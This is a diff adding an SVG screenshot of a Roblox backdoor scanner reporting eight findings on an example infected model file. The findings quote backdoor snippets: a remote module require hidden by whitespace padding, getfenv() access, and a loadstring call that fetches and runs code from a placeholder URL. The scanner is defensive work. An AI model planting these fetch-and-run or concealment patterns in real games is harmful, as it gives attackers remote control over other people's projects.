@@ -1,0 +1,68 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1174" height="659" viewBox="0 0 1174 659">
+<rect width="100%" height="100%" rx="8" fill="#0d0d0d"/>
+<circle cx="20" cy="18" r="6" fill="#ff5f57"/><circle cx="40" cy="18" r="6" fill="#febc2e"/><circle cx="60" cy="18" r="6" fill="#28c840"/>
+<g font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,monospace" font-size="14" fill="#c0c0c0" xml:space="preserve">
+<text x="20.0" y="50" fill="#ff7b00">$&#160;ember&#160;scan&#160;examples/infected_tree.rbxmx</text>
+<text x="28.4" y="88" fill="#ff5f00" font-weight="700">ember</text>
+<text x="78.8" y="88" opacity="0.55">v0.1.0&#160;&#160;Roblox&#160;backdoor&#160;scanner</text>
+<text x="28.4" y="126" fill="#d0d0d0" font-weight="700">examples/infected_tree.rbxmx&#160;&gt;&#160;Pine&#160;Tree.Trunk.Weld</text>
+<text x="45.2" y="145" fill="#ffaf00" font-weight="700">&#160;MEDIUM&#160;&#160;&#160;</text>
+<text x="137.6" y="145" font-weight="700">EMB101</text>
+<text x="188.0" y="145" >&#160;&#160;Script&#160;disguised&#160;as&#160;another&#160;object&#160;&#160;</text>
+<text x="507.2" y="145" opacity="0.55">instance</text>
+<text x="20.0" y="164" >&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Script&#160;is&#160;named&#160;&quot;Weld&quot;</text>
+<rect x="45.2" y="169" width="84.0" height="18" fill="#d70000"/>
+<text x="45.2" y="183" fill="#ffffff" font-weight="700">&#160;CRITICAL&#160;</text>
+<text x="137.6" y="183" font-weight="700">EMB001</text>
+<text x="188.0" y="183" >&#160;&#160;Remote&#160;module&#160;require&#160;&#160;</text>
+<text x="398.0" y="183" opacity="0.55">L3:181</text>
+<text x="20.0" y="202" >&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;require(123456789)&#160;loads&#160;a&#160;module&#160;from&#160;the&#160;Roblox&#160;library&#160;at&#160;runtime&#160;(ID&#160;disguised&#160;as&#160;`0x75BCD15`)</text>
+<text x="78.8" y="221" opacity="0.55">&#160;&#160;&#160;&#160;3&#160;|</text>
+<text x="146.0" y="221" fill="#8a8a8a">weld.Part0&#160;=&#160;part&#160;&lt;162&#160;blanks&gt;&#160;;require(0x75BCD15)</text>
+<text x="45.2" y="240" fill="#ff3b30" font-weight="700">&#160;HIGH&#160;&#160;&#160;&#160;&#160;</text>
+<text x="137.6" y="240" font-weight="700">EMB008</text>
+<text x="188.0" y="240" >&#160;&#160;Code&#160;hidden&#160;by&#160;whitespace&#160;padding&#160;&#160;</text>
+<text x="498.8" y="240" opacity="0.55">L3:180</text>
+<text x="20.0" y="259" >&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;`;require(0x75BCD15)`&#160;is&#160;pushed&#160;162&#160;columns&#160;off-screen</text>
+<text x="78.8" y="278" opacity="0.55">&#160;&#160;&#160;&#160;3&#160;|</text>
+<text x="146.0" y="278" fill="#8a8a8a">weld.Part0&#160;=&#160;part&#160;&lt;162&#160;blanks&gt;&#160;;require(0x75BCD15)</text>
+<text x="28.4" y="316" fill="#d0d0d0" font-weight="700">examples/infected_tree.rbxmx&#160;&gt;&#160;Pine&#160;Tree.Anti-Lag</text>
+<text x="45.2" y="335" fill="#00d7ff" font-weight="700">&#160;LOW&#160;&#160;&#160;&#160;&#160;&#160;</text>
+<text x="137.6" y="335" font-weight="700">EMB103</text>
+<text x="188.0" y="335" >&#160;&#160;Fake&#160;&#x27;anti-virus&#x27;&#160;script&#160;name&#160;&#160;</text>
+<text x="465.2" y="335" opacity="0.55">instance</text>
+<text x="20.0" y="354" >&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Script&#160;is&#160;named&#160;&quot;Anti-Lag&quot;</text>
+<text x="45.2" y="373" fill="#ffaf00" font-weight="700">&#160;MEDIUM&#160;&#160;&#160;</text>
+<text x="137.6" y="373" font-weight="700">EMB005</text>
+<text x="188.0" y="373" >&#160;&#160;Environment&#160;manipulation&#160;&#160;</text>
+<text x="423.2" y="373" opacity="0.55">L2:11</text>
+<text x="20.0" y="392" >&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;getfenv()&#160;accesses&#160;the&#160;function&#160;environment</text>
+<text x="78.8" y="411" opacity="0.55">&#160;&#160;&#160;&#160;2&#160;|</text>
+<text x="146.0" y="411" fill="#8a8a8a">local&#160;e&#160;=&#160;getfenv()</text>
+<rect x="45.2" y="416" width="84.0" height="18" fill="#d70000"/>
+<text x="45.2" y="430" fill="#ffffff" font-weight="700">&#160;CRITICAL&#160;</text>
+<text x="137.6" y="430" font-weight="700">EMB003</text>
+<text x="188.0" y="430" >&#160;&#160;Remote&#160;code&#160;execution&#160;&#160;</text>
+<text x="398.0" y="430" opacity="0.55">L3:3</text>
+<text x="20.0" y="449" >&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;loadstring()&#160;executes&#160;code&#160;fetched&#160;over&#160;HTTP</text>
+<text x="78.8" y="468" opacity="0.55">&#160;&#160;&#160;&#160;3&#160;|</text>
+<text x="146.0" y="468" fill="#8a8a8a">e[&quot;loadstring&quot;](game:GetService(&quot;HttpService&quot;):GetAsync(&quot;https://raw.githubusercontent.com/fake/fake/main/payload.lua...</text>
+<text x="45.2" y="487" fill="#ff3b30" font-weight="700">&#160;HIGH&#160;&#160;&#160;&#160;&#160;</text>
+<text x="137.6" y="487" font-weight="700">EMB006</text>
+<text x="188.0" y="487" >&#160;&#160;Hidden&#160;sensitive&#160;identifier&#160;&#160;</text>
+<text x="448.4" y="487" opacity="0.55">L3:3</text>
+<text x="20.0" y="506" >&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;`loadstring`&#160;is&#160;looked&#160;up&#160;dynamically&#160;with&#160;[&quot;loadstring&quot;]</text>
+<text x="78.8" y="525" opacity="0.55">&#160;&#160;&#160;&#160;3&#160;|</text>
+<text x="146.0" y="525" fill="#8a8a8a">e[&quot;loadstring&quot;](game:GetService(&quot;HttpService&quot;):GetAsync(&quot;https://raw.githubusercontent.com/fake/fake/main/payload.lua...</text>
+<text x="45.2" y="544" fill="#ffaf00" font-weight="700">&#160;MEDIUM&#160;&#160;&#160;</text>
+<text x="137.6" y="544" font-weight="700">EMB012</text>
+<text x="188.0" y="544" >&#160;&#160;Paste/raw&#160;code&#160;host&#160;URL&#160;&#160;</text>
+<text x="414.8" y="544" opacity="0.55">L3:57</text>
+<text x="20.0" y="563" >&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;references&#160;raw.githubusercontent.com</text>
+<text x="78.8" y="582" opacity="0.55">&#160;&#160;&#160;&#160;3&#160;|</text>
+<text x="146.0" y="582" fill="#8a8a8a">e[&quot;loadstring&quot;](game:GetService(&quot;HttpService&quot;):GetAsync(&quot;https://raw.githubusercontent.com/fake/fake/main/payload.lua...</text>
+<rect x="28.4" y="606" width="100.8" height="18" fill="#d70000"/>
+<text x="28.4" y="620" fill="#ffffff" font-weight="700">&#160;8&#160;findings&#160;</text>
+<text x="129.2" y="620" >&#160;in&#160;3&#160;scripts&#160;across&#160;1&#160;file&#160;&#160;</text>
+<text x="372.8" y="620" opacity="0.55">(2&#160;critical,&#160;2&#160;high,&#160;3&#160;medium,&#160;1&#160;low)</text>
+</g></svg>
